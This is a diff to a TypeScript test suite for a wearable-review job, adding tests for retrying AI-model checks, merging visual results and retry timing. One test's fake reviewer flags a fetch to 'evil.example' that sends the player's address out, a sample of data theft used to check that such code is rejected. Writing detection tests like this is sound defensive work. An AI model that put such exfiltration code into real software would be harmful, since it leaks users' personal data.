@@ -5,9 +5,11 @@ import { manifest } from "@dcl-regenesislabs/wearable-validator";
 import { createBuilderComponent, SIGNATURE_HEADER, signature, TIMESTAMP_HEADER } from "../src/adapters/builder.js";
 import { asComment, createSlackComponent, itemMessage } from "../src/adapters/slack.js";
 import type { IWorkQueueComponent, QueueMessage } from "../src/adapters/work-queue.js";
-import { collectionResult, createReviewJob, type CollectionResultBody, type ItemResult } from "../src/logic/review-job.js";
+import { noModelReviewer } from "../src/adapters/reviewer.js";
+import { collectionResult, createReviewJob, mergeVisual, visualRetryDelays, type CollectionResultBody, type ItemResult } from "../src/logic/review-job.js";
 import { InvalidReviewRequest, parseReviewRequest, REVIEW_EVENT, type ReviewItem, type ValidationRequest } from "../src/logic/review-request.js";
-import { fakeRenderer, fakeReviewer, silentLogs, type RenderCalls } from "./fakes.js";
+import { fakeRenderer, fakeReviewer, flakyReviewer, silentLogs, type RenderCalls } from "./fakes.js";
+import type { CaptureRecord, CaptureRequest, Finding, Result, Reviewer } from "@dcl-regenesislabs/wearable-validator";
 import { dinoSkin, dinoSkinResult } from "./fixtures/curated-items.js";
 import { syntheticEntity, type SyntheticEntity } from "../../wearable-validator/test/helpers/entity.js";
 import { pngBytes, syntheticGlb, syntheticZip } from "../../wearable-validator/test/helpers/synthetic.js";
@@ -61,16 +63,27 @@ function fakeQueue(bodies: string[]): IWorkQueueComponent & { deleted: string[] 
   return { deleted, visibilityTimeout: 1800, receive: async () => pending.shift(), delete: async (handle) => void deleted.push(handle), extend: async () => {} };
 }
 
-/** The job wired to fakes; Slack stays off unless a fake Slack is given. */
-async function job(builder: ReturnType<typeof fakeBuilder>, bodies: string[] = [], slackFetch?: typeof globalThis.fetch, secret = SECRET) {
+/** The job wired to fakes; Slack stays off unless a fake Slack is given. Waits before a retry return at once, recorded in `sleeps`, after `onSleep`. */
+async function job(builder: ReturnType<typeof fakeBuilder>, bodies: string[] = [], slackFetch?: typeof globalThis.fetch, secret = SECRET, reviewer: Reviewer = fakeReviewer(), onSleep?: (ms: number, signal: AbortSignal) => void) {
   const logs = silentLogs();
   const calls: RenderCalls = { started: 0 };
+  const sleeps: number[] = [];
   const queue = fakeQueue(bodies);
   const config = createConfigComponent({ BUILDER_API_URL: `${API}/`, ...(secret ? { BUILDER_CALLBACK_SECRET: secret } : {}), ...(slackFetch ? { SLACK_BOT_TOKEN: "xoxb-test", SLACK_CHANNEL: "curation-notifications" } : {}) });
   const slack = await createSlackComponent({ config, logs, fetch: slackFetch });
-  const reviewJob = createReviewJob({ logs, queue, builder: await createBuilderComponent({ config, logs, fetch: builder.fetch, sleep: async () => {} }), renderer: fakeRenderer(calls), reviewer: fakeReviewer(), slack });
-  return { reviewJob, queue, calls };
+  const sleep = async (ms: number, signal: AbortSignal) => void (sleeps.push(ms), onSleep?.(ms, signal));
+  const reviewJob = createReviewJob({ logs, queue, builder: await createBuilderComponent({ config, logs, fetch: builder.fetch, sleep: async () => {} }), renderer: fakeRenderer(calls), reviewer, slack, sleep });
+  return { reviewJob, queue, calls, sleeps };
 }
+
+/** A smart wearable: a scene and the bundle it runs. */
+async function smartWearable(): Promise<SyntheticEntity> {
+  const scene = new TextEncoder().encode(JSON.stringify({ main: "bin/game.js", requiredPermissions: [] }));
+  const zip = await syntheticZip({ extraFiles: { "scene.json": scene, "bin/game.js": new TextEncoder().encode("playSound('beat.mp3')") } });
+  return syntheticEntity(zip, `urn:decentraland:amoy:collections-v2:0x${"cd".repeat(20)}:0`);
+}
+
+const inconclusive = (request: { images: { id: string }[] }) => ({ verdict: "inconclusive", summary: "The item is too small to judge.", reviewedCaptureIds: request.images.map((image) => image.id), findings: [] });
 
 let clean: SyntheticEntity;
 let heavy: SyntheticEntity;
@@ -134,6 +147,57 @@ describe("collectionResult", () => {
   const pick = ({ verdict, reason, retryable }: CollectionResultBody) => ({ verdict, reason, retryable });
 });
 
+describe("mergeVisual", () => {
+  const capture = (key: string, sha256: string): CaptureRecord => ({ request: { id: key, key } as CaptureRequest, bytes: new Uint8Array(), sha256, width: 1, height: 1 });
+  const warning = (check: string): Finding => ({ check, group: "rendering", severity: "warning", message: `${check} warns.`, rule: "V-02", docs: "https://docs.example" });
+  const summary = { errors: 0, warnings: 0, checked: 0, skipped: 0 };
+
+  it("replaces the rows and findings of the checks asked again, adds only the views never drawn, and gives no verdict", () => {
+    const first: Result = {
+      passed: null,
+      checks: [
+        { check: "render-valid", group: "rendering", status: "passed", coverage: "complete" },
+        { check: "thumbnail-honesty", group: "rendering", status: "warning", coverage: "complete" },
+        { check: "visual-quality", group: "rendering", status: "errored", coverage: "missing", retryable: true }
+      ],
+      findings: [warning("thumbnail-honesty")],
+      captures: [capture("front", "a"), capture("side", "b")],
+      summary
+    };
+    const again: Result = {
+      passed: null,
+      checks: [{ check: "visual-quality", group: "rendering", status: "warning", coverage: "complete" }],
+      findings: [warning("visual-quality")],
+      // the retry hands back the views it was given, one with other bytes, and one it had to draw
+      captures: [capture("front", "a"), capture("side", "b2"), capture("motion", "c")],
+      summary
+    };
+    const merged = mergeVisual(first, again);
+    assert.deepEqual(merged.checks.map((row) => `${row.check}:${row.status}`), ["render-valid:passed", "thumbnail-honesty:warning", "visual-quality:warning"]);
+    assert.deepEqual(merged.findings.map((finding) => finding.check), ["thumbnail-honesty", "visual-quality"]);
+    assert.deepEqual(merged.captures.map((entry) => `${entry.request.key}:${entry.sha256}`), ["front:a", "side:b", "motion:c"], "a view is the capture it was requested as: listed once, as first drawn");
+    assert.equal(merged.passed, null, "a subset of the checks is never a verdict");
+    assert.deepEqual(merged.summary, { errors: 0, warnings: 2, checked: 3, skipped: 0 });
+  });
+
+  it("drops the findings of a check asked again before adding its new ones", () => {
+    const row = { check: "smart-wearable-code", group: "code" as const, coverage: "complete" as const };
+    const stale = { ...warning("smart-wearable-code"), group: "code" as const, message: "stale" };
+    const fresh = { ...stale, severity: "error" as const, message: "fresh" };
+    const merged = mergeVisual({ passed: null, checks: [{ ...row, status: "warning" }], findings: [stale], captures: [], summary }, { passed: null, checks: [{ ...row, status: "failed" }], findings: [fresh], captures: [], summary });
+    assert.deepEqual([merged.checks[0].status, merged.findings.map((finding) => finding.message), merged.summary.errors], ["failed", ["fresh"], 1]);
+  });
+});
+
+describe("visualRetryDelays", () => {
+  it("reads VISUAL_RETRY_DELAYS_MS: unset is 10 s then 30 s, empty turns retries off, anything else must be whole milliseconds", () => {
+    assert.deepEqual(visualRetryDelays(undefined), [10_000, 30_000]);
+    assert.deepEqual(visualRetryDelays("5000, 20000,60000"), [5_000, 20_000, 60_000]);
+    assert.deepEqual(visualRetryDelays(""), []);
+    for (const bad of ["10s", "-1", "1.5", "10000,,30000"]) assert.throws(() => visualRetryDelays(bad), /VISUAL_RETRY_DELAYS_MS/);
+  });
+});
+
 describe("the review job", () => {
   it("validates every item and posts one signed result in the Builder's shape", async () => {
     const builder = fakeBuilder([clean, heavy]);
@@ -148,6 +212,103 @@ describe("the review job", () => {
     assert.deepEqual(body.items.map(({ itemId, contentHash, passed }) => [itemId, contentHash, passed]), [[ITEMS[0], "bafkrei11111111", true], [ITEMS[1], "bafkrei22222222", false]]);
     const triangles = body.items[1].findings.find((finding) => finding.check === "triangle-count")!;
     assert.deepEqual([triangles.rule, triangles.severity, typeof triangles.measured, typeof triangles.limit, typeof triangles.fix], ["M-01", "error", "number", "number", "string"]);
+  });
+
+  it("asks an unanswered model check again on the views it already drew, so the item still gets its verdict", async () => {
+    const builder = fakeBuilder([clean]);
+    const reviewer = flakyReviewer({ "visual-quality": 1 });
+    const { reviewJob, calls, sleeps } = await job(builder, [], undefined, SECRET, reviewer);
+    await reviewJob.process(message(envelope(request([item(clean, ITEMS[0])]))));
+    const once = await job(fakeBuilder([clean]));
+    await once.reviewJob.process(message(envelope(request([item(clean, ITEMS[0])]))));
+    assert.equal(reviewer.calls["visual-quality"], 2, "asked once more");
+    assert.equal(reviewer.calls["thumbnail-honesty"], 1, "an answered check is not asked again");
+    assert.deepEqual(sleeps, [10_000]);
+    assert.equal(calls.started, 1, "one render server for the item");
+    assert.equal(calls.frames, once.calls.frames, "no view drawn twice");
+    // every drawing has bytes of its own: the same digests are the same views, not new ones
+    assert.deepEqual(reviewer.seen["visual-quality"][1], reviewer.seen["visual-quality"][0], "asked about the views drawn the first time");
+    const body = builder.body();
+    assert.deepEqual([body.items[0].passed, body.verdict], [true, "passed"]);
+  });
+
+  it("stops after two more tries, 10 s and 30 s apart, and leaves the item without a verdict, worth sending again", async () => {
+    const builder = fakeBuilder([clean]);
+    const reviewer = flakyReviewer({ "visual-quality": 99 });
+    const { reviewJob, sleeps } = await job(builder, [], undefined, SECRET, reviewer);
+    await reviewJob.process(message(envelope(request([item(clean, ITEMS[0])]))));
+    assert.equal(reviewer.calls["visual-quality"], 3, "the first call and two retries");
+    assert.deepEqual(sleeps, [10_000, 30_000]);
+    const body = builder.body();
+    assert.equal(body.items[0].passed, null);
+    assert.deepEqual([body.verdict, body.retryable], ["error", true]);
+  });
+
+  it("fails the item when the check asked again answers that it fails", async () => {
+    const smart = await smartWearable();
+    const builder = fakeBuilder([smart]);
+    const malicious = (req: { texts?: { id: string }[] }) => ({
+      verdict: "malicious",
+      summary: "Sends the wearer's address to an outside server.",
+      findings: [{ kind: "malicious", message: "It posts the player's address to evil.example.", fileId: req.texts!.find((text) => text.id.endsWith("game.js"))!.id, excerpt: "fetch(\"https://evil.example\")" }]
+    });
+    const reviewer = flakyReviewer({ "smart-wearable-code": 1 }, { "smart-wearable-code": malicious });
+    const { reviewJob, sleeps } = await job(builder, [], undefined, SECRET, reviewer);
+    await reviewJob.process(message(envelope(request([item(smart, ITEMS[0])]))));
+    assert.deepEqual([reviewer.calls["smart-wearable-code"], sleeps], [2, [10_000]]);
+    const body = builder.body();
+    assert.deepEqual([body.items[0].passed, body.verdict], [false, "rejected"]);
+    const code = body.items[0].findings.filter((finding) => finding.check === "smart-wearable-code");
+    assert.deepEqual(code.map((finding) => finding.severity), ["error"], "the retried row's finding, once");
+    assert.match(code[0].message, /^Malicious code: It posts the player's address/);
+  });
+
+  it("never asks again for an inconclusive answer: the model declined to judge, and a person decides", async () => {
+    const builder = fakeBuilder([clean]);
+    const reviewer = flakyReviewer({}, { "visual-quality": inconclusive });
+    const { reviewJob, sleeps } = await job(builder, [], undefined, SECRET, reviewer);
+    await reviewJob.process(message(envelope(request([item(clean, ITEMS[0])]))));
+    assert.deepEqual([reviewer.calls["visual-quality"], sleeps], [1, []]);
+    assert.equal(builder.body().items[0].passed, null);
+  });
+
+  it("never asks again without a model: the same question would get the same answer", async () => {
+    const builder = fakeBuilder([clean]);
+    const noModel = noModelReviewer();
+    const asked: Record<string, number> = {};
+    const reviewer: Reviewer = { review: async (req, signal) => ((asked[req.check] = (asked[req.check] ?? 0) + 1), noModel.review(req, signal)) };
+    const { reviewJob, sleeps } = await job(builder, [], undefined, SECRET, reviewer);
+    await reviewJob.process(message(envelope(request([item(clean, ITEMS[0])]))));
+    assert.deepEqual([asked, sleeps], [{ "thumbnail-honesty": 1, "visual-quality": 1 }, []]);
+    assert.equal(builder.body().items[0].passed, null);
+  });
+
+  it("neither waits nor asks again once the job is stopping, and a stop during a wait ends it", async () => {
+    const stoppedFirst = flakyReviewer({ "visual-quality": 1 });
+    const before = await job(fakeBuilder([clean]), [], undefined, SECRET, stoppedFirst);
+    before.reviewJob.stop();
+    await before.reviewJob.process(message(envelope(request([item(clean, ITEMS[0])]))));
+    assert.deepEqual([stoppedFirst.calls["visual-quality"], before.sleeps], [1, []]);
+
+    const stoppedWaiting = flakyReviewer({ "visual-quality": 1 });
+    let aborted: boolean | undefined;
+    const during: Awaited<ReturnType<typeof job>> = await job(fakeBuilder([clean]), [], undefined, SECRET, stoppedWaiting, (_ms, signal) => {
+      during.reviewJob.stop();
+      aborted = signal.aborted;
+    });
+    await during.reviewJob.process(message(envelope(request([item(clean, ITEMS[0])]))));
+    assert.equal(aborted, true, "stop() ends the wait at once");
+    assert.deepEqual([stoppedWaiting.calls["visual-quality"], during.sleeps], [1, [10_000]], "and nothing is asked after it");
+  });
+
+  it("does not ask again when the wait and one model timeout per check would outlast the runtime budget", async () => {
+    const builder = fakeBuilder([clean]);
+    const reviewer = flakyReviewer({ "visual-quality": 1 });
+    const { reviewJob, sleeps } = await job(builder, [envelope(request([item(clean, ITEMS[0])]))], undefined, SECRET, reviewer);
+    // a minute left: less than 10 s plus the adapter's 300 s timeout
+    assert.equal(await reviewJob.drain({ maxRuntimeMs: 60_000, emptyReceivesToExit: 1 }), 1);
+    assert.deepEqual([reviewer.calls["visual-quality"], sleeps], [1, []]);
+    assert.equal(builder.body().items[0].passed, null);
   });
 
   it("downloads a file both body shapes share once", async () => {
@@ -272,9 +433,7 @@ describe("Slack", () => {
   });
 
   it("reviews a smart wearable's code and tells the curators what it does", async () => {
-    const scene = new TextEncoder().encode(JSON.stringify({ main: "bin/game.js", requiredPermissions: [] }));
-    const zip = await syntheticZip({ extraFiles: { "scene.json": scene, "bin/game.js": new TextEncoder().encode("playSound('beat.mp3')") } });
-    const smart = await syntheticEntity(zip, `urn:decentraland:amoy:collections-v2:0x${"cd".repeat(20)}:0`);
+    const smart = await smartWearable();
     const slack = fakeSlack();
     const { reviewJob } = await job(fakeBuilder([smart]), [], slack.fetch);
     assert.equal(await reviewJob.process(message(envelope(request([item(smart, ITEMS[0])])))), "delete");
